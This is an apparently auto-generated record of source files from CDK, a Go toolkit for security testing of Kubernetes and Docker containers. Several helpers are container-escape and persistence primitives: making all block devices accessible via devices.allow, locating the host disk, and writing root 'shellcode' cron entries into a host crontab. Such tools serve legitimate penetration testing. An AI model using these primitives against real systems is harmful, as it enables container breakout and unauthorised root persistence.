# Forensic Learning Record (Deep Inspection): cdk-team/CDK

> **Canonical Artifact**: `07_PROJECT_LEARNING/cdk-team-cdk-learnings.md`  
> **Source Platform**: GitHub ([https://github.com/cdk-team/CDK](https://github.com/cdk-team/CDK))  
> **Harvest Method**: Full-Spectrum Deep Extraction (Patches, Diffs, Source Code, Post-Mortems)  
> **Harvest Timestamp**: 2026-10-06T01:51:05.828Z  
> **Compliance State**: Free Tier Guaranteed | Strict Rate-Limit Backoff Honored  

---

## 1. Context & Architectural Overview
- **Repository / Resource**: `cdk-team/CDK`
- **Description**: 📦  Make security testing of K8s, Docker, and Containerd easier.
- **Primary Language / Ecosystem**: Go
- **Discovered Manifests / Configurations**: go.mod, README.md
- **Stars / Engagement**: 4766 stars

---

## 2. Multi-Dimensional 8-Axis Investigation & Real Code Patches

### D1: Architecture & Structural Boundaries
- Entry configurations inspected via direct stream: go.mod, README.md.
- Evaluated system abstractions and modular contracts.

### Core Architecture Module: `pkg/evaluate/engine.go`
```
package evaluate

import (
	"fmt"
	"log"
	"os"
	"sort"

	"github.com/cdk-team/CDK/pkg/util"
)

const (
	ProfileBasic      = "basic"
	ProfileExtended   = "extended"
	ProfileAdditional = "additional"
)

// Context carries shared dependencies for evaluation checks.
type Context struct {
	Logger *log.Logger
}

// NewContext constructs a Context instance with a default logger when none is provided.
func NewContext(logger *log.Logger) *Context {
	if logger == nil {
		logger = log.New(os.Stderr, "", log.LstdFlags)
	}
	return &Context{Logger: logger}
}

// CheckFunc represents the executable unit for a security check.
type CheckFunc func(*Context) error

// Check describes an actionable evaluation task.
type Check struct {
	ID          string
	Title       string
	Description string
	Run         CheckFunc
}

func (c Check) execute(ctx *Context) error {
	if c.Run == nil {
		return nil
	}
	return c.Run(ctx)
}

// Category groups related checks under a shared heading.
type Category struct {
	ID     string
	Title  string
	Checks []Check
}

func (c Category) run(ctx *Context) {
	util.PrintH2(c.Title)
	logger := loggerFromContext(ctx)
	for _, check := range c.Checks {
		if err := check.execute(ctx); err != nil {
			logger.Printf("check %s failed: %v", readableCheckLabel(check), err)
		}
	}
}

// Profile combines categories into a runnable unit.
type Profile struct {
	ID         string
	Title      string
	Categories []Category
}

func (p Profile) run(ctx *Context) {
	for _, category := range p.Categories {
		category.run(ctx)
	}
}

// Evaluator coordinates profile registration and execution.
type Evaluator struct {
	profiles map[string]Profile
}

// NewEvaluator returns an Evaluator with the default profiles registered.
func NewEvaluator() *Evaluator {
	e := &Evaluator{profiles: make(map[string]Profile)}
	for _, profile := range defaultProfiles() {
		e.RegisterProfile(profile)
	}
	return e
}

// RegisterProfile adds or replaces a profile definition.
func (e *Evaluator) RegisterProfile(profile Profile) {
	if e.profiles == nil {
		e.profiles = make(map[string]Profile)
	}
	e.profiles[profile.ID] = profile
}

// Profile returns a copy of the profile and a boolean indicating whether it exists.
func (e *Evaluator) Profile(id string) (Profile, bool) {
	profile, ok := e.profiles[id]
	return profile, ok
}

// Profiles returns the registered profiles sorted by their identifier.
func (e *Evaluator) Profiles() []Profile {
	out := make([]Profile, 0, len(e.profiles))
	for _, profile := range e.profiles {
		out = append(out, profile)
	}
	sort.Slice(out, func(i, j int) bool {
		return out[i].ID < out[j].ID
	})
	return out
}

// RunProfile executes every category within the selected profile.
func (e *Evaluator) RunProfile(id string, ctx *Context) error {
	profile, ok := e.profiles[id]
	if !ok {
		return fmt.Errorf("unknown profile %q", id)
	}
	if ctx == nil {
		ctx = NewContext(nil)
	}
	profile.run(ctx)
	return nil
}

func loggerFromContext(ctx *Context) *log.Logger {
	if ctx != nil && ctx.Logger != nil {
		return ctx.Logger
	}
	return log.Default()
}

func readableCheckLabel(check Check) string {
	if check.ID != "" {
		return fmt.Sprintf("%s (%s)", check.Title, check.ID)
	}
	return check.Title
}

```

### Core Architecture Module: `pkg/exploit/hwexp/utils.go`
```
/*
Copyright 2022 The Authors of https://github.com/CDK-TEAM/CDK .

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

package hwexp

import (
	"encoding/json"
	"fmt"
	"github.com/cdk-team/CDK/pkg/tool/kubectl"
	"log"
)

type Result struct {
	Code    int
	Message string
}

func (res Result) ToJson() string {

	data, err := json.Marshal(res)
	if err != nil {
		log.Fatal(err)
	}

	return string(data)
}

func (res Result) PrintJson() {

	fmt.Println(res.ToJson())

}

func extractKubectl() string {

	path, err := kubectl.ExtractKubectl()
	if err != nil {
		log.Fatal(err)
	}

	return path
}

```

### Core Architecture Module: `pkg/util/capability/capability_define.go`
```
/*
Copyright 2022 The Authors of https://github.com/CDK-TEAM/CDK .

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

package capability

import (
	"fmt"
	"strconv"
	"strings"
)

/**
 ** POSIX-draft defined capabilities.
 ** Refer to the code https://github.com/torvalds/linux/blob/master/include/uapi/linux/capability.h by torvalds.
 ** Code written by neargle on 2021-02-08, last commit id 9d3a39a5f1e45827b008fff1ee9cf3cac3409665.
 **/

/* In a system with the [_POSIX_CHOWN_RESTRICTED] option defined, this
   overrides the restriction of changing file ownership and group
   ownership. */

var CAP_CHOWN = 0

/* Override all DAC access, including ACL execute access if
   [_POSIX_ACL] is defined. Excluding DAC access covered by
   CAP_LINUX_IMMUTABLE. */

var CAP_DAC_OVERRIDE = 1

/* Overrides all DAC restrictions regarding read and search on files
   and directories, including ACL restrictions if [_POSIX_ACL] is
   defined. Excluding DAC access covered by CAP_LINUX_IMMUTABLE. */

var CAP_DAC_READ_SEARCH = 2

/* Overrides all restrictions about allowed operations on files, where
   file owner ID must be equal to the user ID, except where CAP_FSETID
   is applicable. It doesn't override MAC and DAC restrictions. */

var CAP_FOWNER = 3

/* Overrides the following restrictions that the effective user ID
   shall match the file owner ID when setting the S_ISUID and S_ISGID
   bits on that file; that the effective group ID (or one of the
   supplementary group IDs) shall match the file owner ID when setting
   the S_ISGID bit on that file; that the S_ISUID and S_ISGID bits are
   cleared on successful return from chown(2) (not implemented). */

var CAP_FSETID = 4

/* Overrides the restriction that the real or effective user ID of a
   process sending a signal must match the real or effective user ID
   of the process receiving the signal. */

var CAP_KILL = 5

/* Allows setgid(2) manipulation */
/* Allows setgroups(2) */
/* Allows forged gids on socket credentials passing. */

var CAP_SETGID = 6

/* Allows set*uid(2) manipulation (including fsuid). */
/* Allows forged pids on socket credentials passing. */

var CAP_SETUID = 7

/**
 ** Linux-specific capabilities
 **/

/* Without VFS support for capabilities:
 *   Transfer any capability in your permitted set to any pid,
 *   remove any capability in your permitted set from any pid
 * With VFS support for capabilities (neither of above, but)
 *   Add any capability from current's capability bounding set
 *       to the current process' inheritable set
 *   Allow taking bits out of capability bounding set
 *   Allow modification of the securebits for a process
 */

var CAP_SETPCAP = 8

/* Allow modification of S_IMMUTABLE and S_APPEND file attributes */

var CAP_LINUX_IMMUTABLE = 9

/* Allows binding to TCP/UDP sockets below 1024 */
/* Allows binding to ATM VCIs below 32 */

var CAP_NET_BIND_SERVICE = 10

/* Allow broadcasting, listen to multicast */

var CAP_NET_BROADCAST = 11

/* Allow interface configuration */
/* Allow administration of IP firewall, masquerading and accounting */
/* Allow setting debug option on sockets */
/* Allow modification of routing tables */
/* Allow setting arbitrary process / process group ownership on
   sockets */
/* Allow binding to any address for transparent proxying (also via NET_RAW) */
/* Allow setting TOS (type of service) */
/* Allow setting promiscuous mode */
/* Allow clearing driver statistics */
/* Allow multicasting */
/* Allow read/write of device-specific registers */
/* Allow activation of ATM control sockets */

var CAP_NET_ADMIN = 12

/* Allow use of RAW sockets */
/* Allow use of PACKET sockets */
/* Allow binding to any address for transparent proxying (also via NET_ADMIN) */

var CAP_NET_RAW = 13

/* Allow locking of shared memory segments */
/* Allow mlock and mlockall (which doesn't really have anything to do
   with IPC) */

var CAP_IPC_LOCK = 14

/* Override IPC ownership checks */

var CAP_IPC_OWNER = 15

/* Insert and remove kernel modules - modify kernel without limit */
var CAP_SYS_MODULE = 16

/* Allow ioperm/iopl access */
/* Allow sending USB messages to any device via /dev/bus/usb */

var CAP_SYS_RAWIO = 17

/* Allow use of chroot() */

var CAP_SYS_CHROOT = 18

/* Allow ptrace() of any process */

var CAP_SYS_PTRACE = 19

/* Allow configuration of process accounting */

var CAP_SYS_PACCT = 20

/* Allow configuration of the secure attention key */
/* Allow administration of the random device */
/* Allow examination and configuration of disk quotas */
/* Allow setting the domainname */
/* Allow setting the hostname */
/* Allow calling bdflush() */
/* Allow mount() and umount(), setting up new smb connection */
/* Allow some autofs root ioctls */
/* Allow nfsservctl */
/* Allow VM86_REQUEST_IRQ */
/* Allow to read/write pci config on alpha */
/* Allow irix_prctl on mips (setstacksize) */
/* Allow flushing all cache on m68k (sys_cacheflush) */
/* Allow removing semaphores */
/* Used instead of CAP_CHOWN to "chown" IPC message queues, semaphores
   and shared memory */
/* Allow locking/unlocking of shared memory segment */
/* Allow turning swap on/off */
/* Allow forged pids on socket credentials passing */
/* Allow setting readahead and flushing buffers on block devices */
/* Allow setting geometry in floppy driver */
/* Allow turning DMA on/off in xd driver */
/* Allow administration of md devices (mostly the above, but some
   extra ioctls) */
/* Allow tuning the ide driver */
/* Allow access to the nvram device */
/* Allow administration of apm_bios, serial and bttv (TV) device */
/* Allow manufacturer commands in isdn CAPI support driver */
/* Allow reading non-standardized portions of pci configuration space */
/* Allow DDI debug ioctl on sbpcd driver */
/* Allow setting up serial ports */
/* Allow sending raw qic-117 commands */
/* Allow enabling/disabling tagged queuing on SCSI controllers and sending
   arbitrary SCSI commands */
/* Allow setting encryption key on loopback filesystem */
/* Allow setting zone reclaim policy */
/* Allow everything under CAP_BPF and CAP_PERFMON for backward compatibility */

var CAP_SYS_ADMIN = 21

/* Allow use of reboot() */

var CAP_SYS_BOOT = 22

/* Allow raising priority and setting priority on other (different
   UID) processes */
/* Allow use of FIFO and round-robin (realtime) scheduling on own
   processes and setting the scheduling algorithm used by another
   process. */
/* Allow setting cpu affinity on other processes */
/* Allow setting realtime ioprio class */
/* Allow setting ioprio class on other processes */

var CAP_SYS_NICE = 23

/* Override resource limits. Set resource limits. */
/* Override quota limits. */
/* Override reserved space on ext2 filesystem */
/* Modify data journaling mode on ext3 filesystem (uses journaling
   resources) */
/* NOTE: ext2 honors fsuid when checking for resource overrides, so
   you can override using fsuid too */
/* Override size restrictions on IPC message queues */
/* Allow more than 64hz interrupts from the real-time clock */
/* Override max number of consoles on console allocation */
/* Override max number of keymaps */
/* Control memory reclaim behavior */

var CAP_SYS_RESOURCE = 24

/* Allow manipulation of system clock */
/* Allow irix_stime on mips */
/* Allow setting the real-time clock */

var CAP_SYS_TIME = 25

/* Allow configuration of tty devices */
/* Allow vhangup() of tty */

var CAP_SYS_TTY_CONFIG = 26

/* Allow the privileged aspects of mknod() */

var CAP_MKNOD = 27

/* Allow taking of leases on files */

var CAP_LEASE = 28

/* Allow writing the audit log via unicast netlink socket */

var CAP_AUDIT_WRITE = 29

/* Allow configuration of audit via unicast netlink socket */

var CAP_AUDIT_CONTROL = 30

/* Set or remove capabilities on files */

var CAP_SETFCAP = 31

/* Override MAC access.
   The base kernel enforces no MAC policy.
   An LSM may enforce a MAC policy, and if it does and it chooses
   to implement capability based overrides of that policy, this is
   the capability it should use to do so. */

var CAP_MAC_OVERRIDE = 32

/* Allow MAC configuration or state changes.
   The base kernel requires no MAC configuration.
   An LSM may enforce a MAC policy, and if it does and it chooses
   to implement capability based checks on modifications to that
   policy or the data required to maintain it, this is the
   capability it should use to do so. */

var CAP_MAC_ADMIN = 33

/* Allow configuring the kernel's syslog (printk behaviour) */

var CAP_SYSLOG = 34

/* Allow triggering something that will wake the system */

var CAP_WAKE_ALARM = 35

/* Allow preventing system suspends */

var CAP_BLOCK_SUSPEND = 36

/* Allow reading the audit log via multicast netlink socket */

var CAP_AUDIT_READ = 37

/*
 * Allow system performance and observability privileged operations
 * using perf_events, i915_perf and other kernel subsystems
 */

var CAP_PERFMON = 38

/*
 * CAP_BPF allows the following BPF operations:
 * - Creating all types of BPF maps
 * - Advanced verifier features
 *   - Indirect variable access
 *   - Bounded loops
 *   - BPF to BPF function calls
 *   - Scalar precision tracking
 *   - Larger complexity limits
 *   - Dead code elimination
 *   - And potentially other features
 * - Loading BPF Type Format (BTF) data
 * - Retrieve xlated and JITed code of BPF programs
 * - Use bpf_spin_lock() helper
 *
 * CAP_PERFMON relaxes the verifier checks further:
 * - BPF progs can use of pointer-to-integer conversions
 * - speculation attac
```

### Core Architecture Module: `pkg/util/cgroup.go`
```
/*
Copyright 2022 The Authors of https://github.com/CDK-TEAM/CDK .

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

package util

import (
	"bufio"
	"errors"
	"fmt"
	"log"
	"os"
	"strconv"
	"strings"

	"golang.org/x/sys/unix"
)

const mountInfoPath string = "/proc/self/mountinfo"
const hostDeviceFlag string = "/etc/hosts"
const cgroupInfoPath string = "/proc/self/cgroup"

// MountInfo
// Sample: 36 35 98:0 /mnt1 /mnt2 rw,noatime master:1 - ext3 /dev/root rw,errors=continue
// Sample2: 1659 1605 253:1 /var/lib/kubelet/pods/cc76265f-d44d-4624-91c8-6f6812f85c7e/etc-hosts /etc/hosts rw,noatime - ext4 /dev/vda1 rw
// Sample3: 52 36 0:47 / /sys/fs/cgroup/memory rw,nosuid,nodev,noexec,relatime shared:26 - cgroup cgroup rw,memory
// format: mountID parentID major:minor root mountPoint opts - Fstype device SuperBlockOptions
type MountInfo struct {
	Device            string
	Fstype            string
	Root              string
	MountPoint        string
	Opts              []string
	Major             string
	Minor             string
	SuperBlockOptions []string
}

// String format: major:minor root mountPoint opts - Fstype device SuperBlockOptions
func (mi MountInfo) String() string {
	optStr := strings.Join(mi.Opts, ",")
	superBlockOptionsStr := strings.Join(mi.SuperBlockOptions, ",")
	return fmt.Sprintf("%s:%s %s %s %s - %s %s %s", mi.Major, mi.Minor, mi.Root, mi.MountPoint, optStr, mi.Fstype, mi.Device, superBlockOptionsStr)
}

// find block device id
func FindTargetDeviceID(mi *MountInfo) bool {
	if mi.MountPoint == hostDeviceFlag {
		log.Printf("found host blockDeviceId Major: %s Minor: %s\n", mi.Major, mi.Minor)
		return true
	}
	return false
}

func GetMountInfo() ([]MountInfo, error) {
	f, err := os.Open(mountInfoPath)
	if err != nil {
		return nil, err
	}
	defer f.Close()

	var ret []string

	r := bufio.NewReader(f)
	for {
		line, err := r.ReadString('\n')
		if err != nil {
			break
		}
		ret = append(ret, strings.Trim(line, "\n"))
	}
	// 2346 2345 0:261 / /proc rw,nosuid,nodev,noexec,relatime - proc proc rw
	mountInfos := make([]MountInfo, len(ret))

	for _, r := range ret {
		parts := strings.Split(r, " - ")
		if len(parts) != 2 {
			return nil, fmt.Errorf("found invalid mountinfo line in file %s: %s ", mountInfoPath, r)
		}
		mi := MountInfo{}

		// former Part
		// https://man7.org/linux/man-pages/man5/proc.5.html
		fields := strings.Fields(parts[0])
		// mountID = fields[0] ; parentID = fields[1]
		blockId := strings.Split(fields[2], ":")
		if len(blockId) != 2 {
			return nil, fmt.Errorf("found invalid mountinfo line in file %s: %s ", mountInfoPath, r)
		}
		mi.Major = blockId[0]
		mi.Minor = blockId[1]
		mi.Root = fields[3]
		mi.MountPoint = fields[4]
		mi.Opts = strings.Split(fields[5], ",")

		// latter part
		// from https://man7.org/linux/man-pages/man5/proc.5.html
		// Fstype: the filesystem type in the form "type[.subtype]".
		// Device: filesystem-specific information or "none".
		// SuperBlockOptions: per-superblock options (see mount(2)).
		fields = strings.Fields(parts[1])
		if len(fields) <= 1 || len(fields) > 3 {
			// unexpect mountinfo
			return nil, fmt.Errorf("found invalid mountinfo line in file %s: %s ", mountInfoPath, r)
		}

		mi.Fstype = fields[0]

		if len(fields) == 2 {
			// means Device is "none"
			mi.Device = ""
			mi.SuperBlockOptions = strings.Split(fields[1], ",")
		} else {
			mi.Device = fields[1]
			mi.SuperBlockOptions = strings.Split(fields[2], ",")
		}

		mountInfos = append(mountInfos, mi)
	}

	return mountInfos, err
}

func MakeDev(major, minor string) int {
	ret1, err := strconv.ParseInt(major, 10, 64)
	if err != nil {
		log.Printf("convert major number to int64 err: %v\n", err)
		return 0
	}
	ret2, err := strconv.ParseInt(minor, 10, 64)
	if err != nil {
		log.Printf("convert minor number to int64 err: %v\n", err)
		return 0
	}

	return int(((ret1 & 0xfff) << 8) | (ret2 & 0xff) | ((ret1 &^ 0xfff) << 32) | ((ret2 & 0xfffff00) << 12))
}

// set all block device accessible
func SetBlockAccessible(path string) error {
	f, err := os.OpenFile(path, os.O_WRONLY|os.O_SYNC, 0200)
	if err != nil {
		return fmt.Errorf("open devices.allow failed. %v\n", err)
	}
	defer f.Close()

	l, err := f.Write([]byte("a"))
	if err != nil {
		return fmt.Errorf("write devices.allow failed. %v\n", err)
	}

	if l != 1 {
		return fmt.Errorf("write \"a\" to devices.allow failed.\n")
	}
	log.Printf("set all block device accessible success.\n")

	return nil
}

// get kernel version
func GetKernelVersion() ([]int, error) {
	utsInfo := &unix.Utsname{}
	err := unix.Uname(utsInfo)
	if err != nil {
		return nil, err
	}
	relStr := string(utsInfo.Release[:])
	relIdx := strings.Index(relStr, "-")
	if relIdx == -1 {
		return nil, errors.New("unknown internal error when executing uname")
	}
	ret := make([]int, 3)
	for _, v := range strings.Split(relStr[:relIdx], ".") {
		verData, err := strconv.Atoi(v)
		if err != nil {
			return nil, err
		}
		ret = append(ret, verData)
	}
	return ret, nil
}

// get cgroup version V1/V2
// hybrid mode will not work in container
func GetCgroupVersion() (int, error) {
	// detect by /sys/fs/cgroup/cgroup.controllers
	// others:
	// or /proc/filesystems
	// or directly try to mount cgroup2 with none
	_, err := os.Stat("/sys/fs/cgroup/cgroup.controllers")
	if err == nil {
		return 2, nil
	}
	if strings.Contains(err.Error(), "no such file or directory") {
		return 1, nil
	}
	return -1, err
}

type CgroupInfo struct {
	HierarchyID   int
	ControllerLst string // split by "," but should not be split
	CgroupPath    string
	OriginalInfo  string
}

func GetAllCGroup() ([]CgroupInfo, error) {
	return GetCgroup(0)
}

// GetCgroup returns the cgroup info of the process
// param pid: 0 = self, 1 = container main process
func GetCgroup(pid int) ([]CgroupInfo, error) {
	var cginfo []CgroupInfo
	var pidStr string

	if pid == 0 {
		pidStr = "self"
	} else {
		pidStr = fmt.Sprint(pid)
	}

	cgroupInfoPath := fmt.Sprintf("/proc/%s/cgroup", pidStr)
	datafd, err := os.Open(cgroupInfoPath)
	if err != nil {
		return nil, err
	}
	defer datafd.Close()

	sc := bufio.NewScanner(datafd)
	for sc.Scan() {
		// Sample "9:devices:/docker/fc1413683c2976fa292c0b1e011224706c1ecc151bad9ceabc9cfcb8dce4ddbb"
		originalInfo := sc.Text()
		singleCG := strings.Split(strings.TrimSuffix(originalInfo, "\n"), ":")
		hID, err := strconv.Atoi(singleCG[0])
		if err != nil {
			return nil, err
		}
		cginfo = append(cginfo, CgroupInfo{hID, singleCG[1], singleCG[2], originalInfo})
	}

	return cginfo, nil
}

func GetAllCGroupSubSystem() ([]string, error) {
	cgSyses, err := GetAllCGroup()
	if err != nil {
		return nil, err
	}
	var syses []string
	for _, v := range cgSyses {
		syses = append(syses, v.ControllerLst)
	}
	return syses, nil
}

```

### Core Architecture Module: `pkg/util/colorful.go`
```
package util

import (
	"fmt"
	"io"
	"log"
	"os"

	"github.com/fatih/color"
)

type Level uint8

const (
	ERROR Level = iota
	WARNNING
	INFO
	DEBUG
)

var DefaultLevel = INFO

const (
	DebugPrefix = "[DEBUG] "
	InfoPrefix  = "[INFO_]  "
	WarnPrefix  = "[WARN_]  "
	ErrorPrefix = "[ERROR] "
)

// Colorful Bold
// use like `GreenBold.Sprint(str)`
var (
	RedBold    = color.New(color.FgRed).Add(color.Bold)
	GreenBold  = color.New(color.FgGreen).Add(color.Bold)
	YellowBold = color.New(color.FgYellow).Add(color.Bold)
	BlueBold   = color.New(color.FgBlue).Add(color.Bold)
)

type LevelLogger struct {
	Level Level
	Color bool

	PrintFunc func(format string, v ...interface{})
}

var (
	ColorDebugPrefix = GreenBold.Sprint(DebugPrefix)
	ColorInfoPrefix  = BlueBold.Sprint(InfoPrefix)
	ColorWarnPrefix  = YellowBold.Sprint(WarnPrefix)
	ColorErrorPrefix = RedBold.Sprint(ErrorPrefix)
)

func (l *LevelLogger) Debug(format string, v ...interface{}) {
	if l.Level >= DEBUG {
		prefix := DebugPrefix
		if l.Color {
			prefix = ColorDebugPrefix
		}

		temp := fmt.Sprintf("%s%s", prefix, format)
		l.PrintFunc(temp, v...)
	}
}

func (l *LevelLogger) Info(format string, v ...interface{}) {
	if l.Level >= INFO {
		prefix := InfoPrefix
		if l.Color {
			prefix = ColorInfoPrefix
		}

		temp := fmt.Sprintf("%s%s", prefix, format)
		l.PrintFunc(temp, v...)
	}
}

func (l *LevelLogger) Warn(format string, v ...interface{}) {
	if l.Level >= WARNNING {
		prefix := WarnPrefix
		if l.Color {
			prefix = ColorWarnPrefix
		}

		temp := fmt.Sprintf("%s%s", prefix, format)
		l.PrintFunc(temp, v...)
	}
}

func (l *LevelLogger) Error(format string, v ...interface{}) {
	prefix := ErrorPrefix
	if l.Color {
		prefix = ColorErrorPrefix
	}

	temp := fmt.Sprintf("%s%s", prefix, format)
	l.PrintFunc(temp, v...)
}

func (l *LevelLogger) Close() {}

type Wrapper struct {
	logger *log.Logger

	LevelLogger
}

func NewWrapper(writer io.Writer, colorful bool) *Wrapper {
	logger := log.New(writer, "", log.LstdFlags|log.Lshortfile)

	return &Wrapper{
		logger: logger,
		LevelLogger: LevelLogger{
			Level:     DefaultLevel,
			Color:     colorful,
			PrintFunc: logger.Printf,
		},
	}
}

func NewStdoutWrapper() *Wrapper {
	return NewWrapper(os.Stdout, true)
}

```

### Core Architecture Module: `pkg/util/common.go`
```
/*
Copyright 2022 The Authors of https://github.com/CDK-TEAM/CDK .

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

package util

import (
	"fmt"
	"io/ioutil"
	"math/rand"
	"os/exec"
	"strings"
	"time"

	"github.com/cdk-team/CDK/pkg/errors"
)

func ByteToString(orig []byte) string {
	n := -1
	l := -1
	for i, b := range orig {
		// skip left side null
		if l == -1 && b == 0 {
			continue
		}
		if l == -1 {
			l = i
		}

		if b == 0 {
			break
		}
		n = i + 1
	}
	if n == -1 {
		return string(orig)
	}
	return string(orig[l:n])
}

func RandString(n int) string {
	// grabbed from https://stackoverflow.com/questions/22892120/how-to-generate-a-random-string-of-a-fixed-length-in-go
	const (
		letterBytes   = "abcde1fghij2klmno3pqrst4uvwxy5zABCD6EFGHI7JKLMN8OPQRS9TUVWX9YZ"
		letterIdxBits = 6                    // 6 bits to represent a letter index
		letterIdxMask = 1<<letterIdxBits - 1 // All 1-bits, as many as letterIdxBits
		letterIdxMax  = 63 / letterIdxBits   // # of letter indices fitting in 63 bits
	)
	sb := strings.Builder{}
	sb.Grow(n)
	rand.Seed(time.Now().UnixNano())
	// rand.Int63() generates 63 random bits, enough for letterIdxMax characters!
	for i, cache, remain := n-1, rand.Int63(), letterIdxMax; i >= 0; {
		if remain == 0 {
			cache, remain = rand.Int63(), letterIdxMax
		}
		if idx := int(cache & letterIdxMask); idx < len(letterBytes) {
			sb.WriteByte(letterBytes[idx])
			i--
		}
		cache >>= letterIdxBits
		remain--
	}

	return sb.String()
}

func RemoveDuplicateElement(addrs []string) []string {
	result := make([]string, 0, len(addrs))
	temp := map[string]struct{}{}
	for _, item := range addrs {
		if _, ok := temp[item]; !ok {
			temp[item] = struct{}{}
			result = append(result, item)
		}
	}
	return result
}

// dataFromSliceOrFile returns data from the slice (if non-empty), or from the file,
// or an error if an error occurred reading the file
func dataFromSliceOrFile(data []byte, file string) ([]byte, error) {
	if len(data) > 0 {
		return data, nil
	}
	if len(file) > 0 {
		fileData, err := ioutil.ReadFile(file)
		if err != nil {
			return []byte{}, err
		}
		return fileData, nil
	}
	return nil, nil
}

// ShellExec run shell script by bash
func ShellExec(shellPath string) error {
	var command = shellPath
	if strings.HasPrefix(shellPath, "/") {
		command = shellPath
	} else {
		command = fmt.Sprintf("./%s .", shellPath)
	}
	cmd := exec.Command("/bin/bash", "-c", command)

	output, err := cmd.Output()
	if err != nil {
		return &errors.CDKRuntimeError{Err: err, CustomMsg: fmt.Sprintf("Execute Shell:%s failed", command)}
	}
	fmt.Printf("Execute Shell:%s finished with output:\n%s", command, string(output))
	return nil
}

// StringContains check string array contains a string
func StringContains(s []string, e string) bool {
	// grabbed from https://stackoverflow.com/questions/10485743/contains-method-for-a-slice
	for _, a := range s {
		if a == e {
			return true
		}
	}
	return false
}

// IntContains check string array contains a int number
func IntContains(s []int, e int) bool {
	for _, a := range s {
		if a == e {
			return true
		}
	}
	return false
}

// DistinctArr distinct
func DistinctStrArr(s []string) []string {
	distinctMap := make(map[string]bool)
	var result []string

	for _, item := range s {
		if _, exists := distinctMap[item]; !exists {
			distinctMap[item] = true
			result = append(result, item)
		}
	}

	return result
}

```

### Core Architecture Module: `pkg/util/file_io.go`
```
/*
Copyright 2022 The Authors of https://github.com/CDK-TEAM/CDK .

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

package util

import (
	"bufio"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"os"
	"syscall"

	"github.com/cdk-team/CDK/pkg/errors"
)

func IsDirectory(path string) bool {
	fileInfo, err := os.Stat(path)
	if err != nil {
		return false
	}
	return fileInfo.IsDir()
}

// ReadLines reads a whole file into memory
// and returns a slice of its lines.
// from https://stackoverflow.com/questions/5884154/read-text-file-into-string-array-and-write
func ReadLines(path string) ([]string, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}
	return lines, scanner.Err()
}

func FileExist(path string) bool {
	fileInfo, err := os.Stat(path)
	if os.IsNotExist(err) {
		return false
	}
	return !fileInfo.IsDir()
}

func IsSoftLink(FilePath string) bool {
	fileInfo, err := os.Lstat(FilePath)
	if err != nil {
		return false
	}
	if sys := fileInfo.Sys(); sys != nil {
		if stat, ok := sys.(*syscall.Stat_t); ok {
			nlink := uint64(stat.Nlink)
			if nlink == 1 { // soft link ==1; hard link == 2
				return true
			}
		}
	}
	return false
}

func IsDir(FilePath string) bool {
	fileInfo, err := os.Stat(FilePath)
	if err != nil {
		return false
	}
	return fileInfo.IsDir()
}

func RewriteFile(path string, content string, perm os.FileMode) {
	cmdFile, err := os.OpenFile(path, os.O_TRUNC|os.O_WRONLY|os.O_CREATE, perm)
	if err != nil {
		log.Fatal("overwrite file:", path, "err: "+err.Error())
	} else {
		n, _ := cmdFile.Seek(0, io.SeekEnd)
		_, err = cmdFile.WriteAt([]byte(content), n)
		log.Println("overwrite file:", path, "success.")
		defer cmdFile.Close()
	}
}

func WriteFile(path string, content string) error {
	var d = []byte(content)
	err := ioutil.WriteFile(path, d, 0666)
	if err != nil {
		return err
	}
	return nil
}

func WriteFileAdd(path string, content string) error {
	file, err := os.OpenFile(path, os.O_WRONLY|os.O_APPEND, 0666)
	if err != nil {
		return err
	}
	_, err = file.Write([]byte(content))
	if err != nil {
		return err
	}
	file.Close()
	return nil
}

func WriteShellcodeToCrontab(header string, filePath string, shellcode string) error {
	shellcode = fmt.Sprintf("\n%s\n* * * * * root %s", header, shellcode)
	err := WriteFileAdd(filePath, shellcode)
	if err != nil {
		return &errors.CDKRuntimeError{Err: err, CustomMsg: "err found while writing shellcode to host crontab from container."}
	}
	return nil
}

```

### Core Architecture Module: `pkg/util/http_request.go`
```
/*
Copyright 2022 The Authors of https://github.com/CDK-TEAM/CDK .

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

package util

import (
	"bytes"
	"context"
	"github.com/cdk-team/CDK/pkg/errors"
	"io"
	"io/ioutil"
	"net"
	"net/http"
	"strings"
)

// ref https://docs.docker.com/engine/api/v1.24/
